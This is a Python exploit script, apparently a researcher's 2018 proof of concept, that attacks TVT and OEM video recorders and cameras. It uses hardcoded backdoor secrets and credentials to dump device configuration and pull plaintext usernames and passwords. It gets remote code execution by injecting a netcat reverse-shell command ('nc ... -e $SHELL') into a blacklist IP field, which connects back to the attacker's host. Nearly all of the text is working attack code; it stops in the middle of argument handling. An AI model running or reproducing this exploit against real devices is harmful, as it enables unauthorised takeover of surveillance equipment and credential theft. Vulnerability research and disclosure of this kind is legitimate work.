#!/usr/bin/env python2.7
# [SOF]
#
# Subject: Shenzhen TVT Digital Technology Co. Ltd & OEM {DVR/NVR/IPC} API RCE
#
# Attack vector: Remote
# Authentication: Anonymous (no credentials needed)
# Researcher: bashis <mcw noemail eu> (December 2018)
#
# Vulnerable: To many OEM vendors,products and versions to specify.
# Non Vulnerable: Firmware released from mid February 2018 from TVT and their OEM's
#
# Source Vendor: Shenzhen TVT Digital Technology Co. Ltd (http://en.tvt.net.cn/)
# OEM Vendors (+80): https://ipvm.com/forums/video-surveillance/topics/a-list-of-tvt-s-79-dvr-oems (Not complete list)
#
#
import socket
import select
import sys
import urllib, urllib2, httplib
import ssl
import argparse
import base64
import os
import sys
import xmltodict # pip install xmltodict
import json

from pwn import *	# https://github.com/Gallopsled/pwntools

class HTTPconnect:

	def __init__(self, host, proto, verbose, credentials, Raw, noexploit):
		self.host = host
		self.proto = proto
		self.verbose = verbose
		self.credentials = credentials
		self.Raw = Raw
		self.noexploit = noexploit
	
	def Send(self, uri, query_headers, query_data, ID):
		self.uri = uri
		self.query_headers = query_headers
		self.query_data = query_data
		self.ID = ID

		# Connect-timeout in seconds
		timeout = 10
		socket.setdefaulttimeout(timeout)

		url = '{}://{}{}'.format(self.proto, self.host, self.uri)

		if self.verbose:
			print "[Verbose] Sending:", url

		if self.proto == 'https':
			if hasattr(ssl, '_create_unverified_context'):
				print "[i] Creating SSL Unverified Context"
				ssl._create_default_https_context = ssl._create_unverified_context

		if self.credentials:
			Basic_Auth = self.credentials.split(':')
			if self.verbose:
				print "[Verbose] User:",Basic_Auth[0],"Password:",Basic_Auth[1]
			try:
				pwd_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
				pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
				auth_handler = urllib2.HTTPBasicAuthHandler(pwd_mgr)
				opener = urllib2.build_opener(auth_handler)
				urllib2.install_opener(opener)
			except Exception as e:
				print "[!] Basic Auth Error:",e
				sys.exit(1)

		if self.noexploit and not self.verbose:
			print "[<] 204 Not Sending!"
			html =  "Not sending any data"
			return html
		else:
			if self.query_data:
				req = urllib2.Request(url, self.query_data, headers=self.query_headers)
			else:
				req = urllib2.Request(url, None, headers=self.query_headers)
			try:
				rsp = urllib2.urlopen(req)
			except Exception as e:
				if not hasattr (e,'reason'):
					print "[<] Request is most likely being blocked ({})".format(str(e))
				else:
					print "[<] Payload response failed: {}".format(str(e))
				return False

		if self.Raw:
			return rsp
		else:
			html = rsp.read()
			return html

#
# Validate correctness of HOST, IP and PORT
#
class Validate:

	def __init__(self,verbose):
		self.verbose = verbose

	# Check if IP is valid
	def CheckIP(self,IP):
		self.IP = IP

		ip = self.IP.split('.')
		if len(ip) != 4:
			return False
		for tmp in ip:
			if not tmp.isdigit():
				return False
			i = int(tmp)
			if i < 0 or i > 255:
				return False
		return True

	# Check if PORT is valid
	def Port(self,PORT):
		self.PORT = PORT

		if int(self.PORT) < 1 or int(self.PORT) > 65535:
			return False
		else:
			return True

	# Check if HOST is valid
	def Host(self,HOST):
		self.HOST = HOST

		try:
			# Check valid IP
			socket.inet_aton(self.HOST) # Will generate exeption if we try with DNS or invalid IP
			# Now we check if it is correct typed IP
			if self.CheckIP(self.HOST):
				return self.HOST
			else:
				return False
		except socket.error as e:
			# Else check valid DNS name, and use the IP address
			try:
				self.HOST = socket.gethostbyname(self.HOST)
				return self.HOST
			except socket.error as e:
				return False


class TVT:

	def __init__(self, rhost, rport, proto, verbose, credentials, raw_request, noexploit, headers):
		self.rhost = rhost
		self.rport = rport
		self.proto = proto
		self.verbose = verbose
		self.credentials = credentials
		self.raw_request = raw_request
		self.noexploit = noexploit
		self.headers = headers

		self.BUFFER_SIZE = 1024

	def APIConfigClient(self, lhost, lport, cmd, request):
		self.lhost = lhost
		self.lport = lport
		self.cmd = cmd
		self.request = request

		if self.rport == '4567' and self.cmd != 'doLogin':
			self.sock = self.Connect_4567()
			response = self.GetSystemConfig(self.sock, self.request)
			response = response.split()

		if self.cmd == 'DumpSystemConfig':
			if self.rport == '4567':
				TVT_bin = base64.b64decode(response[12]) # Base64 'SystemConfig'
				XML_2_JSON = self.GetXML_2_JSON(TVT_bin)
				print "[i] Dumping Config"
				for what in XML_2_JSON.keys():
					print json.dumps(XML_2_JSON[what],indent=4)
			else:
				if (self.GetDeviceInfo_HTTP(lhost, lport,True)): # Light version of 'SystemConfig'
					return True
				else:
					return False

		elif self.cmd == 'GetInfo':
			if self.rport == '4567':
				TVT_bin = base64.b64decode(response[12]) # Base64 'SystemConfig'
				XML_2_JSON = self.GetXML_2_JSON(TVT_bin)
				self.Extract_Info(XML_2_JSON)
			else:
				if (self.GetDeviceInfo_HTTP(lhost, lport,False)):
					return True
				else:
					return False

		elif self.cmd == 'doLogin':
			if self.rport == '4567':
				print "[!] Login do not work here, no need for it..."
				return True
			else:
				if (self.doLogin_HTTP(lhost, lport)):
					return True
				else:
					return False

		elif self.cmd == 'queryQRInfo':
			if self.rport == '4567':
				OUT = ''
				for xml in range(15,len(response)):
					OUT += response[xml]
				XML_2_JSON = xmltodict.parse(OUT)
				if XML_2_JSON['response']['status'] == 'success':
					QR_img = base64.b64decode(XML_2_JSON['response']['content']['data'])
					file = open(rhost + '_QR.png','wb')
					file.write(QR_img)
					file.close()
					print "[i] QR Image saved: {}".format(rhost + '_QR.png')
			else:

				if (self.queryQRInfo_HTTP(self.lhost, self.lport)):
					return True
				else:
					return False

		elif self.cmd == 'GetUsernamePassword':
			if self.rport == '4567':
				TVT_bin = base64.b64decode(response[12]) # Base64 'SystemConfig'
				XML_2_JSON = self.GetXML_2_JSON(TVT_bin)
				username, password = self.GetLoginPassword(TVT_bin, XML_2_JSON)
				print "[i] Username: {}, Password: {}".format(username,password)
			else:
				if (self.queryUserList_HTTP(self.lhost, self.lport)):
					return True
				else:
					return False

		elif self.cmd == 'RCE':
			if self.rport == '4567':
				self.RCE_4567(self.lhost, self.lport, self.sock)
			else:
				if(self.RCE_HTTP(self.lhost, self.lport)):
					return True
				else:
					return False

		if self.rport == '4567':
			self.sock.close()
			print "[i] Disconnected"

#
# Stuff for HTTP/HTTPS Access
#

	def queryQRInfo_HTTP(self, lhost, lport):

		self.lhost = lhost
		self.lport = lport
		self.remote_host = self.rhost + ':' + self.rport

		headers = {
			'Connection': 'close',
			'Content-Type'	:	'application/x-www-form-urlencoded',
			'Host'	:	rhost,
			'Authorization'	:	'Basic ' + base64.b64encode(self.credentials),
			'Accept'	:	'*/*',
			'Accept-Language'	:	'en-us',
			'Cache-Control'	:	'max-age=0',
			'User-Agent':'ApiTool'
			}

		URI = '/queryQRInfo?userName=' + self.credentials.split(":")[0]
		response = HTTPconnect(self.remote_host,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,headers,None,None)
		if not response:
			return False
		file = open(rhost + '_QR.png','wb')
		file.write(response)
		file.close()
		print "[i] QR Image saved: {}".format(rhost + '_QR.png')
		return True

	def doLogin_HTTP(self, lhost, lport):
		self.lhost = lhost
		self.lport = lport
		self.remote_host = self.rhost + ':' + self.rport

		headers = {
			'Connection': 'close',
			'Content-Type'	:	'application/x-www-form-urlencoded',
			'Host'	:	rhost,
			'Authorization'	:	'Basic ' + base64.b64encode(self.credentials),
			'Accept'	:	'*/*',
			'Accept-Language'	:	'en-us',
			'Cache-Control'	:	'max-age=0',
			'User-Agent':'ApiTool'
			}

		MSG = '<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>'

		URI = '/doLogin'
		print "[>] Query for username(s)/password(s)"
		response = HTTPconnect(self.remote_host,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,headers,MSG,None)
		if not response:
			return False
		self.XML_2_JSON = xmltodict.parse(response)
		if self.XML_2_JSON['response']['status'] == 'success':
			print "[<] 200 OK"
#			print json.dumps(self.XML_2_JSON['response'],indent=4)
			for who in self.XML_2_JSON['response']['content']:
				if who == 'userId': 
					print "[<] User ID: {}".format(self.XML_2_JSON['response']['content']['userId'])
				elif who == 'adminName': 
					print "[<] Admin Name: {}".format(self.XML_2_JSON['response']['content']['adminName'])
				elif who == 'sessionId': 
					print "[<] Session ID: {}".format(self.XML_2_JSON['response']['content']['sessionId'])
				elif who == 'resetPassword': 
					print "[<] Reset Password: {}".format(base64.b64decode(self.XML_2_JSON['response']['content']['resetPassword']))
			return True
		else:
			if self.XML_2_JSON['response']['errorCode'] == '536870948':
				print "[<] Wrong Password!"
			elif self.XML_2_JSON['response']['errorCode'] == '536870947':
				print "[<] Wrong Username!"
			else:
				print json.dumps(self.XML_2_JSON['response'],indent=4)
			return False

	def queryUserList_HTTP(self, lhost, lport):
		self.lhost = lhost
		self.lport = lport
		self.remote_host = self.rhost + ':' + self.rport

		headers = {
			'Connection': 'close',
			'Content-Type'	:	'application/x-www-form-urlencoded',
			'Host'	:	rhost,
			'Authorization'	:	'Basic ' + base64.b64encode(self.credentials),
			'Accept'	:	'*/*',
			'Accept-Language'	:	'en-us',
			'Cache-Control'	:	'max-age=0',
			'User-Agent':'ApiTool'
			}

		MSG = '<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>'

		URI = '/queryUserList'
		print "[>] Query for username(s)/password(s)"
		response = HTTPconnect(self.remote_host,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,headers,MSG,None)
		if not response:
			return False
		self.XML_2_JSON = xmltodict.parse(response)
		if self.XML_2_JSON['response']['status'] == 'success':
			print "[<] 200 OK"
#			print json.dumps(self.XML_2_JSON['response'],indent=4)
			# One User only
			for who in self.XML_2_JSON['response']['content']['item']:
				if who == 'userName': 
					print "[<] Username: {}, Password: {}".format(self.XML_2_JSON['response']['content']['item']['userName'], self.XML_2_JSON['response']['content']['item']['password'])
					return True
			# Several Users
			for who in range(0, len(self.XML_2_JSON['response']['content']['item'])):
				if (self.XML_2_JSON['response']['content']['item'][who]['enabled'] == 'true'):
					print "[<] Username: {}, Password: {}".format(self.XML_2_JSON['response']['content']['item'][who]['userName'], self.XML_2_JSON['response']['content']['item'][who]['password'])
			return True
		else:
			if self.XML_2_JSON['response']['errorCode'] == '536870948':
				print "[<] Wrong Password!"
			elif self.XML_2_JSON['response']['errorCode'] == '536870947':
				print "[<] Wrong Username!"
			else:
				print json.dumps(self.XML_2_JSON['response'],indent=4)
			return False

	def GetDeviceInfo_HTTP(self, lhost, lport, dump):
		self.lhost = lhost
		self.lport = lport
		self.dump = dump
		self.remote_host = self.rhost + ':' + self.rport

		headers = {
			'Connection': 'close',
			'Content-Type'	:	'application/x-www-form-urlencoded',
			'Host'	:	rhost,
			'Authorization'	:	'Basic ' + base64.b64encode(self.credentials),
			'Accept'	:	'*/*',
			'Accept-Language'	:	'en-us',
			'Cache-Control'	:	'max-age=0',
			'User-Agent':'ApiTool'
			}

		MSG = '<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>'

		URI = '/queryBasicCfg'
		print "[>] Get info about remote target"
		response = HTTPconnect(self.remote_host,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,headers,MSG,None)
		if not response:
			return False
		self.XML_2_JSON = xmltodict.parse(response)
		if self.XML_2_JSON['response']['status'] == 'success':
			print "[<] 200 OK"
			if self.dump:
				print json.dumps(self.XML_2_JSON,indent=4)
				return True
		else:
			if self.XML_2_JSON['response']['errorCode'] == '536870948':
				print "[<] Wrong Password!"
			elif self.XML_2_JSON['response']['errorCode'] == '536870947':
				print "[<] Wrong Username!"
			else:
				print json.dumps(self.XML_2_JSON['response'],indent=4)
			return False

		for tmp2 in self.XML_2_JSON['response'].keys():
			if tmp2 == 'content':
				for tmp3 in self.XML_2_JSON['response'][tmp2].keys():
					if tmp3 == 'softwareVersion':
						print "[i] Firmware Version: {}".format(self.XML_2_JSON['response'][tmp2]['softwareVersion'])
					elif tmp3 == 'kenerlVersion':
						print "[i] Kernel Version: {}".format(self.XML_2_JSON['response'][tmp2]['kenerlVersion'])
					elif tmp3 == 'launchDate':
						print "[i] Software Date: {}".format(self.XML_2_JSON['response'][tmp2]['launchDate'])
					elif tmp3 == 'hardwareVersion':
						print "[i] Hardware Version: {}".format(self.XML_2_JSON['response'][tmp2]['hardwareVersion'])
					elif tmp3 == 'customerId':
						print "[i] Customer/OEM ID: {}".format(self.XML_2_JSON['response'][tmp2]['customerId'])
					elif tmp3 == 'manufacturer':
						print "[i] Manufacture/OEM: {}".format(self.XML_2_JSON['response'][tmp2]['manufacturer']['item'][0]['@translateKey'])
					elif tmp3 == 'sn':
						print "[i] Serial Number: {}".format(self.XML_2_JSON['response'][tmp2]['sn'])
					elif tmp3 == 'productModel':
						print "[i] Device Model: {}".format(self.XML_2_JSON['response'][tmp2]['productModel'])
					elif tmp3 == 'name':
						print "[i] Device Name: {}".format(self.XML_2_JSON['response'][tmp2]['name'])
					elif tmp3 == 'defaultUser':
						print "[i] Default User: {}".format(self.XML_2_JSON['response'][tmp2]['defaultUser']['item']['#text'])
		return True

	def RCE_HTTP(self, lhost, lport):

		self.lhost = lhost
		self.lport = lport
		self.remote_host = self.rhost + ':' + self.rport

		if not (self.GetDeviceInfo_HTTP(lhost, lport,False)):
			return False

		headers = {
			'Connection': 'close',
			'Content-Type'	:	'text/xml',
			'Host'	:	rhost,
			'Authorization'	:	'Basic ' + base64.b64encode(self.credentials),
			'Accept'	:	'*/*',
			'Accept-Language'	:	'en-us',
			'Cache-Control'	:	'max-age=0',
			'User-Agent':'ApiTool'
			}

		ADD_RCE = """<?xml version="1.0" encoding="utf-8"?>
					<request version="1.0" systemType="NVMS-9000" clientType="WEB">
					<types>
						<filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode>
						<addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType>
					</types>
						<content>
							<switch>true</switch>
							<filterType type="filterTypeMode">refuse</filterType>
							<filterList type="list"><itemType><addressType type="addressType"/></itemType>
								<item><switch>true</switch><addressType>ip</addressType>
									<ip>$(nc${IFS}LHOST${IFS}LPORT${IFS}-e${IFS}$SHELL&)</ip>
								</item>
							</filterList>
						</content>
					</request>
				"""
		DEL_RCE = """<?xml version="1.0" encoding="utf-8"?>
					<request version="1.0" systemType="NVMS-9000" clientType="WEB">
					<types>
						<filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode>
						<addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType>
					</types>
						<content><switch>false</switch><filterType type="filterTypeMode">allow</filterType>
							<filterList type="list">
								<itemType>
									<addressType type="addressType"/>
								</itemType>
							</filterList>
						</content>
					</request>
				"""

		ADD_RCE = ADD_RCE.replace("LHOST",self.lhost).replace("\t",'').replace("\n",'')
		ADD_RCE = ADD_RCE.replace("LPORT",self.lport)
		DEL_RCE = DEL_RCE.replace("\t",'').replace("\n",'')

		URI = '/editBlackAndWhiteList'
		#
		# Enable RCE and execute
		#
		print "[>] Adding and executing RCE"
		response = HTTPconnect(self.remote_host,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,headers,ADD_RCE,None)
		if not response:
			return False
		XML_2_JSON = xmltodict.parse(response)
		if XML_2_JSON['response']['status'] == 'success':
			print "[<] 200 OK"
		elif XML_2_JSON['response']['status'] == 'fail':
			if self.XML_2_JSON['response']['errorCode'] == '536870948':
				print "[<] Wrong Password!"
			elif self.XML_2_JSON['response']['errorCode'] == '536870947':
				print "[<] Wrong Username!"
			else:
				print json.dumps(self.XML_2_JSON['response'],indent=4)
			return False

		#
		# Delete RCE
		#
		print "[>] Removing RCE"
		response = HTTPconnect(self.remote_host,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,headers,DEL_RCE,None)
		if not response:
			return False
		XML_2_JSON = xmltodict.parse(response)
		if XML_2_JSON['response']['status'] == 'success':
			print "[<] 200 OK"
		elif XML_2_JSON['response']['status'] == 'fail':
			if self.XML_2_JSON['response']['errorCode'] == '536870948':
				print "[<] Wrong Password!"
			elif self.XML_2_JSON['response']['errorCode'] == '536870947':
				print "[<] Wrong Username!"
			else:
				print json.dumps(self.XML_2_JSON['response'],indent=4)
			return False

		return True

#
# Stuff when bypassing 'ConfigSyncProc'
#

	def GetLoginPassword(self, TVT, XML_2_JSON):
		self.TVT = TVT
		self.XML_2_JSON = XML_2_JSON

		# Username may not always be 'admin'; so get default username to search for
		for what in self.XML_2_JSON.keys():
			for tmp in self.XML_2_JSON[what].keys():
				if tmp == 'response':
					for tmp2 in self.XML_2_JSON[what]['response'].keys():
						if tmp2 == 'content':
							for tmp3 in self.XML_2_JSON[what]['response'][tmp2].keys():
								if tmp3 == 'defaultUser':
									DEFAULT_USER = str(self.XML_2_JSON[what]['response'][tmp2]['defaultUser']['item']['#text'])

		where = self.TVT.find(DEFAULT_USER)
		LOGIN = self.TVT[where:where+64].replace('\x00','')
		PASSWORD = self.TVT[where+64:where+128].replace('\x00','')
		return LOGIN, PASSWORD

	def GetXML_2_JSON(self, TVT):
		self.TVT = TVT

		self.TVT = self.TVT.replace('\x00','')
		where = self.TVT.find('<?xml version="1.0" encoding="UTF-8"?>')
		DB = {}
		TEST = ''
		DB_CNT = 0
		TEMP = self.TVT[where:].split('\n')
		for where in range(0,len(TEMP)):
			if TEMP[where] == '<?xml version="1.0" encoding="UTF-8"?>':
				DB[DB_CNT] = {'start':0,'stop':0}
				DB[DB_CNT]['start'] = where
				DB_CNT += 1
			else:
				DB[DB_CNT-1]['stop'] = where+1

		XML_2_JSON = {}
		for what in DB.keys():
			OUT = ''
			for where in range (DB[what]['start'], DB[what]['stop']):
				OUT += TEMP[where]
			XML_2_JSON[what] = xmltodict.parse(OUT)
		return XML_2_JSON

	def Extract_Info(self, XML_2_JSON):
		self.XML_2_JSON = XML_2_JSON

		for what in self.XML_2_JSON.keys():
			for tmp in self.XML_2_JSON[what].keys():
#				if tmp == 'request':
#					for tmp2 in self.XML_2_JSON[what]['request'].keys():
#						if tmp2 == 'content':
#							for tmp3 in self.XML_2_JSON[what]['request'][tmp2].keys():
#								if tmp3 == 'reservedPort':
#									print "[i] Reserved Port(s): {}".format(self.XML_2_JSON[what]['request'][tmp2]['reservedPort'])
#								elif tmp3 == 'httpPort':
#									print "[i] HTTP Port: {}".format(self.XML_2_JSON[what]['request'][tmp2]['httpPort'])
#								elif tmp3 == 'nicConfigs':
#									print "[i] NIC Configs: {}".format(json.dumps(self.XML_2_JSON[what]['request'][tmp2]['nicConfigs']['item'],indent=4))
#				elif tmp == 'response':
				if tmp == 'response':
					for tmp2 in self.XML_2_JSON[what]['response'].keys():
						if tmp2 == 'content':
							for tmp3 in self.XML_2_JSON[what]['response'][tmp2].keys():
								if tmp3 == 'softwareVersion':
									print "[i] Firmware Version: {}".format(self.XML_2_JSON[what]['response'][tmp2]['softwareVersion'])
								elif tmp3 == 'kenerlVersion':
									print "[i] Kernel Version: {}".format(self.XML_2_JSON[what]['response'][tmp2]['kenerlVersion'])
								elif tmp3 == 'launchDate':
									print "[i] Software Date: {}".format(self.XML_2_JSON[what]['response'][tmp2]['launchDate'])
								elif tmp3 == 'hardwareVersion':
									print "[i] Hardware Version: {}".format(self.XML_2_JSON[what]['response'][tmp2]['hardwareVersion'])
								elif tmp3 == 'customerId':
									print "[i] Customer/OEM ID: {}".format(self.XML_2_JSON[what]['response'][tmp2]['customerId'])
								elif tmp3 == 'manufacturer':
									print "[i] Manufacture/OEM: {}".format(self.XML_2_JSON[what]['response'][tmp2]['manufacturer']['item'][0]['@translateKey'])
								elif tmp3 == 'sn':
									print "[i] Serial Number: {}".format(self.XML_2_JSON[what]['response'][tmp2]['sn'])
								elif tmp3 == 'productModel':
									print "[i] Device Model: {}".format(self.XML_2_JSON[what]['response'][tmp2]['productModel'])
								elif tmp3 == 'name':
									print "[i] Device Name: {}".format(self.XML_2_JSON[what]['response'][tmp2]['name'])
								elif tmp3 == 'defaultUser':
									print "[i] Default User: {}".format(self.XML_2_JSON[what]['response'][tmp2]['defaultUser']['item']['#text'])

	def RCE_4567(self, lhost, lport, sock):
		self.lhost = lhost
		self.lport = lport
		self.sock = sock

		ADD_MESSAGE = "GET /saveSystemConfig HTTP/1.1\r\nAuthorization: Basic\r\nContent-type: text/xml\r\nContent-Length: CONTENT_LENGTH\r\n{D79E94C5-70F0-46BD-965B-E17497CCB598} 2\r\n\r\n"
		ADD_RCE = "\x0c\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x21\x00\x02\x00\x01\x00\x04\x00_LEN_LEN\x00\x00\x00\x00" # 32 bytes
		ADD_RCE += """<?xml version="1.0" encoding="utf-8"?>
					<request version="1.0" systemType="NVMS-9000" clientType="WEB">
					<types>
						<filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode>
						<addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType>
					</types>
						<content>
							<switch>true</switch>
							<filterType type="filterTypeMode">refuse</filterType>
							<filterList type="list"><itemType><addressType type="addressType"/></itemType>
								<item><switch>true</switch><addressType>ip</addressType>
									<ip>$(nc${IFS}LHOST${IFS}LPORT${IFS}-e${IFS}$SHELL${IFS}&)</ip>
								</item>
							</filterList>
						</content>
					</request>
				"""
		ADD_RCE += "\x00"

		DEL_MESSAGE = "GET /saveSystemConfig HTTP/1.1\r\nAuthorization: Basic\r\nContent-type: text/xml\r\nContent-Length: CONTENT_LENGTH\r\n{D79E94C5-70F0-46BD-965B-E17497CCB598} 3\r\n\r\n"
		DEL_RCE = "\x0c\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x21\x00\x02\x00\x01\x00\x04\x00_LEN_LEN\x00\x00\x00\x00" # 32 bytes
		DEL_RCE += """<?xml version="1.0" encoding="utf-8"?>
					<request version="1.0" systemType="NVMS-9000" clientType="WEB">
					<types>
						<filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode>
						<addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType>
					</types>
						<content><switch>false</switch><filterType type="filterTypeMode">allow</filterType>
							<filterList type="list">
								<itemType>
									<addressType type="addressType"/>
								</itemType>
							</filterList>
						</content>
					</request>
				"""
		DEL_RCE += "\x00"

		ADD_RCE = ADD_RCE.replace("LHOST",self.lhost).replace("\t",'').replace("\n",'')
		ADD_RCE = ADD_RCE.replace("LPORT",self.lport)
		DEL_RCE = DEL_RCE.replace("\t",'').replace("\n",'')

		#
		# Enable RCE and execute
		#
		LEN = len(ADD_RCE)-32
		LEN = struct.pack("<I",LEN) 
		ADD_RCE = string.replace(ADD_RCE,'_LEN',LEN)

		ADD_MESSAGE = ADD_MESSAGE.replace("CONTENT_LENGTH",str(len(base64.b64encode(ADD_RCE))))
		ADD_MESSAGE += base64.b64encode(ADD_RCE)

		print "[i] Adding and executing RCE"
		response = self.Send_4567(self.sock, ADD_MESSAGE)
		tmp = response.split()
		if tmp[1] != '200':
			print "[!] Error".format(response)
			return False

		#
		# Delete RCE
		#
		LEN = len(DEL_RCE)-32
		LEN = struct.pack("<I",LEN) 
		DEL_RCE = string.replace(DEL_RCE,'_LEN',LEN)

		DEL_MESSAGE = DEL_MESSAGE.replace("CONTENT_LENGTH",str(len(base64.b64encode(DEL_RCE))))
		DEL_MESSAGE += base64.b64encode(DEL_RCE)

		print "[i] Removing RCE"
		response = self.Send_4567(self.sock, DEL_MESSAGE)
		if tmp[1] != '200':
			print "[!] Error".format(response)
			return False

	def Send_4567(self, sock, message):
		self.sock = sock
		self.message = message

		try:
			print "[>] Sending"
			self.sock.send(self.message)
			response = self.sock.recv(self.BUFFER_SIZE)
		except Exception as e:
			print "[!] Send failed ({})".format(e)
			self.sock.close()
			sys.exit(1)

		print "[<] 200 OK"
		return response

	def Connect_4567(self):

		TVT_rport = 4567			# Default Remote PORT
		MESSAGE = "{D79E94C5-70F0-46BD-965B-E17497CCB598}" # Hardcoded 'Secret' string

		timeout = 5
		socket.setdefaulttimeout(timeout)
		try:
			self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.sock.connect((self.rhost, TVT_rport))
			print "[i] Connected"
		except Exception as e:
			print "[!] Connection failed ({})".format(e)
			sys.exit(1)

		try:
			print "[>] Verifying access"
			self.sock.send(MESSAGE)
			response = self.sock.recv(self.BUFFER_SIZE)
		except Exception as e:
			print "[!] Sending failed ({})".format(e)
			self.sock.close()
			sys.exit(1)


		if response != MESSAGE:
			print "[!] NO MATCH\n[!] Response: {}".format(response)
			self.sock.close()
			sys.exit(0)
		else:
			print "[<] 200 OK"
		return self.sock

	def GetSystemConfig(self, sock, request):
		self.sock = sock
		self.request = request

		# Get System Config, including l/p in clear text (base64 encoded)
		if self.request == 'requestSystemConfig':
			MESSAGE = "GET /requestSystemConfig HTTP/1.1\r\nAuthorization: Basic\r\nContent-type: text/xml\r\nContent-Length:0\r\n{D79E94C5-70F0-46BD-965B-E17497CCB598} 1\r\n\r\n"

		elif self.request == 'requestSystemCapabilitySetInfo':
			MESSAGE = "GET /requestSystemCapabilitySetInfo HTTP/1.1\r\nAuthorization: Basic\r\nContent-type: text/xml\r\nContent-Length:0\r\n{D79E94C5-70F0-46BD-965B-E17497CCB598} 1\r\n\r\n"
		# Get QR Code image in format .png (base64 encoded)
		elif self.request == 'queryQRInfo':
			MESSAGE = "GET /queryQRInfo HTTP/1.1\r\nAuthorization: Basic\r\nContent-type: text/xml\r\nContent-Length:0\r\n{D79E94C5-70F0-46BD-965B-E17497CCB598} 1\r\n\r\n"
		# Default for RCE, only to pass thru below checkings
		else:
			MESSAGE = "GET /queryQRInfo HTTP/1.1\r\nAuthorization: Basic\r\nContent-type: text/xml\r\nContent-Length:0\r\n{D79E94C5-70F0-46BD-965B-E17497CCB598} 1\r\n\r\n"

		self.sock.send(MESSAGE)
		buf = ''
		response = self.sock.recv(self.BUFFER_SIZE)
		if response.split()[1] == '200':
			tmp = response.split()[6] # Content-Length:
		else:
			tmp = False
		buf += response

		if int(tmp) and int(tmp) > self.BUFFER_SIZE:
			try:
				while True:
					if len(buf.split()[12]) == int(tmp):
						break
					if self.sock:
						response = self.sock.recv(self.BUFFER_SIZE)
					else:
						break
					buf += response
			except Exception as e:
				print "[!] Error ({})".format(e)
				self.sock.close()
				sys.exit(1)
		return buf


if __name__ == "__main__":

	INFO =  '\nTVT & OEM {DVR/NVR/IPC} API RCE (2018 bashis)\n'

	rhost = '192.168.57.20'	# Default Remote HOST
	rport = '80'			# Default Remote PORT
	lhost = '192.168.57.1'	# Default Local HOST
	lport = '1337'			# Default Local PORT

	HTTP = "http"
	HTTPS = "https"
	proto = HTTP
	verbose = False
	noexploit = False
	raw_request = True
#	credentials = 'admin:123456'	# Default l/p
	credentials = 'admin:{12213BD1-69C7-4862-843D-260500D1DA40}'	# Hardcoded HTTP/HTTPS API l/p

	headers = {
		'Connection': 'close',
		'Content-Type'	:	'application/x-www-form-urlencoded',
		'Accept'	:	'gzip, deflate',
		'Accept-Language'	:	'en-US,en;q=0.8',
		'Cache-Control'	:	'max-age=0',
		'User-Agent':'ApiTool'
		}

	try:
		arg_parser = argparse.ArgumentParser(
		prog=sys.argv[0],
				description=('[*] '+ INFO +' [*]'))
		arg_parser.add_argument('--rhost', required=True, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']')
		arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ str(rport) +']')
		arg_parser.add_argument('--lhost', required=False, help='Connect Back Address (IP/FQDN) [Default: '+ lhost +']')
		arg_parser.add_argument('--lport', required=False, help='Connect Back Port [Default: '+ lport + ']')
		arg_parser.add_argument('--autoip', required=False, default=False, action='store_true', help='Detect External Connect Back IP [Default: False]')

		arg_parser.add_argument('--getrce', required=False, default=False, action='store_true', help='Remote Command Execution (Reverse Shell)')
		arg_parser.add_argument('--getdump', required=False, default=False, action='store_true', help='Dump System Config from remote target')
		arg_parser.add_argument('--getinfo', required=False, default=False, action='store_true', help='Extract some device info from remote target')
		arg_parser.add_argument('--getcreds', required=False, default=False, action='store_true', help='Extract username/password from remote target')
		arg_parser.add_argument('--getQR', required=False, default=False, action='store_true', help='Get and save QR Code Image [<rhost>_QR.png]')
		arg_parser.add_argument('--getlogin', required=False, default=False, action='store_true', help='Login PoC at remote target')

		if credentials:
			arg_parser.add_argument('--auth', required=False, help='Basic Authentication [Default: '+ credentials + ']')
		arg_parser.add_argument('--https', required=False, default=False, action='store_true', help='Use HTTPS for remote connection [Default: HTTP]')
		arg_parser.add_argument('-v','--verbose', required=False, default=False, action='store_true', help='Verbose mode [Default: False]')
		arg_parser.add_argument('--noexploit', required=False, default=False, action='store_true', help='Simple testmode; With --verbose testing all code without exploiting [Default: False]')
		args = arg_parser.parse_args()
	except Exception as e:
		print INFO,"\nError: {}\n".format(str(e))
		sys.exit(1)

	print INFO

	request = ''
	if args.getrce:
		cmd = 'RCE'
	elif args.getdump:
		cmd = 'DumpSystemConfig'
		request = 'requestSystemConfig'
	elif args.getinfo:
		cmd = 'GetInfo'
		request = 'requestSystemConfig'
	elif args.getcreds:
		cmd = 'GetUsernamePassword'
		request = 'requestSystemConfig'
	elif args.getQR:
		cmd = 'queryQRInfo'
		request = 'queryQRInfo'
	elif args.getlogin:
		cmd = 'doLogin'
		request = 'doLogin'
	else:
		print "[!] Choose something to do...\n[--getrce | --getdump | --getinfo | --getcreds | --getQR | --getlogin]"
		sys.exit(1)

	if args.https:
		proto = HTTPS
		if not args.rport:
			rport = '443'

	if credentials and args.auth:
		credentials = args.auth

	if args.noexploit:
		noexploit = args.noexploit

	if args.verbose:
		verbose = True

	if args.rport:
		rport = args.rport

	if args.rhost:
		rhost = args.rhost

	if args.lport:
		lport = args.lport

	if args.lhost:
